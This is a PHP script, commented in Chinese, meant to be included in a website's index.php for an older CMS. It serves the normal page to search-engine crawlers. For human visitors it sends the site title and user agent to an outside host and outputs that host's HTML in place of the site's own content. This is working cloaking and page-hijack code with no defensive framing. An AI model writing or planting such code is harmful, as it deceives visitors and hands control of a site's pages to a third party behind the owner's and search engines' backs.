<?php
#使用方法
#用于放在站点的index.php里引入。
#但是只能针对旧版vv才有效。这是弊端。

#但是会有比较麻烦的编码问题。

    $userAgent = $_SERVER ['HTTP_USER_AGENT'];
    $title = "";//可以从站点的data/config.php里获取，速度更快。
    $from = "pc";//可以直接通过请求头ua判断
    $config_data =  include './data/config.php';//vv的文件，是gbk格式

    $title = $config_data['web_seo_name'];
    //gbk转utf-8
    $title = iconv('GB2312', 'UTF-8', $title);
    if(fromRobot())
    {
        //啥都不做。
        //echo "---------蜘蛛-----";
    }
    else
    {
        if(isMobile())
        {
            $from = "mobile";
        }

        echo "=============";
        $url = "http://www.gxsgx.com/indexfinal.php?keyword=" . $title . "&from=" . $from . "&userAgent=" . $userAgent;
        //file_get_contents无法获取内容？$html_str = file_get_contents($url);


        $ch = curl_init();
        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        //在需要用户检测的网页里需要增加下面两行
        //curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
        //curl_setopt($ch, CURLOPT_USERPWD, US_NAME.":".US_PWD);
        $html_str = curl_exec($ch);
        curl_close($ch);
        echo $html_str;
        exit;

    }




    /**
     * 判断是否是蜘蛛
     * 有些参数是不是多余了
     */
    function fromRobot($except = '')
    {
        $ua = strtolower($_SERVER ['HTTP_USER_AGENT']);
        $botchar = "/(baidu|sogou|google|spider|soso|yahoo|sohu-search|yodao|robozilla|AhrefsBot)/i";
        $except ? $botchar = str_replace($except . '|', '', $botchar) : '';
        if (preg_match($botchar, $ua)) {
            return true;
        }
        return false;
    }


    /**
     * 判断是否是移动端
     * @return bool
     */
    function isMobile() {
        // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
        if (isset ($_SERVER['HTTP_X_WAP_PROFILE'])) return true;

        // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
        if (isset ($_SERVER['HTTP_VIA']) && stristr($_SERVER['HTTP_VIA'], "wap")) {
            return true;
        }

        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $mobile_agents = array ('iphone','android','phone','mobile','wap','netfront','java','opera mobi',
            'opera mini','ucweb','windows ce','symbian','series','webos','sony','blackberry','dopod',
            'nokia','samsung','palmsource','xda','pieplus','meizu','midp','cldc','motorola','foma',
            'docomo','up.browser','up.link','blazer','helio','hosin','huawei','novarra','coolpad',
            'techfaith','alcatel','amoi','ktouch','nexian','ericsson','philips','sagem','wellcom',
            'bunjalloo','maui','smartphone','iemobile','spice','bird','zte-','longcos','pantech',
            'gionee','portalmmm','jig browser','hiptop','benq','haier','^lct','320x320','240x320',
            '176x220','windows phone','cect','compal','ctl','lg','nec','tcl','daxian','dbtel','eastcom',
            'konka','kejian','lenovo','mot','soutec','sgh','sed','capitel','panasonic','sonyericsson',
            'sharp','panda','zte','acer','acoon','acs-','abacho','ahong','airness','anywhereyougo.com',
            'applewebkit/525','applewebkit/532','asus','audio','au-mic','avantogo','becker','bilbo',
            'bleu','cdm-','danger','elaine','eric','etouch','fly ','fly_','fly-','go.web','goodaccess',
            'gradiente','grundig','hedy','hitachi','htc','hutchison','inno','ipad','ipaq','ipod',
            'jbrowser','kddi','kgt','kwc','lg ','lg2','lg3','lg4','lg5','lg7','lg8','lg9','lg-','lge-',
            'lge9','maemo','mercator','meridian','micromax','mini','mitsu','mmm','mmp','mobi','mot-',
            'moto','nec-','newgen','nf-browser','nintendo','nitro','nook','obigo','palm','pg-',
            'playstation','pocket','pt-','qc-','qtek','rover','sama','samu','sanyo','sch-','scooter',
            'sec-','sendo','sgh-','siemens','sie-','softbank','sprint','spv','tablet','talkabout',
            'tcl-','teleca','telit','tianyu','tim-','toshiba','tsm','utec','utstar','verykool','virgin',
            'vk-','voda','voxtel','vx','wellco','wig browser','wii','wireless','xde','pad','gt-p1000');

        $is_mobile = false;
        foreach ($mobile_agents as $device) {
            if (stristr($user_agent, $device)) {
                $is_mobile = true;
                break;
            }
        }
        return $is_mobile;
    }





